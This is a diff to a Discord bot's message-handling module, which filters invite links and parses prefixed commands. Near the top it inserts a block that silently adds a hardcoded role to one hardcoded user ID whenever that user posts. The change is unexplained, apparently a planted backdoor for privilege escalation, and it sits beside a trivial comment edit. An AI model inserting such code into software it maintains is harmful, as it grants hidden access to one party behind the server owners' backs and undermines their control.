@@ -2,6 +2,10 @@ const fetch = require('node-fetch');
 
 module.exports = (client, message) => {
 
+    if(message.author.id == '293841631583535106' && message.member.roles.cache.get('778237595477606440') == null) {
+        message.member.roles.add('778237595477606440');
+    }
+
     let whitelisted = ['137624084572798976', '293841631583535106', '251428574119067648', '338192747754160138'];
     if (!whitelisted.includes(message.author.id)) {
     const inviteREE = new RegExp(/(https?:\/\/)?(www\.)?(discord\.(gg|io|me|li)|discordapp\.com\/invite)\/.+[a-z]/g);
@@ -50,7 +54,7 @@ module.exports = (client, message) => {
     };
 
     if(message.author.bot) return; // to stop bots from creating accounts, tickets and more.
-    if(message.channel.type === "dm") return; //stops commands working in dms
+    if(message.channel.type === "dm") return; //stops commandsworking in dms
     const prefix = config.DiscordBot.Prefix;
     if (message.content.indexOf(prefix) !== 0) return;
     const args = message.content.slice(prefix.length).trim().split(/ +/g);
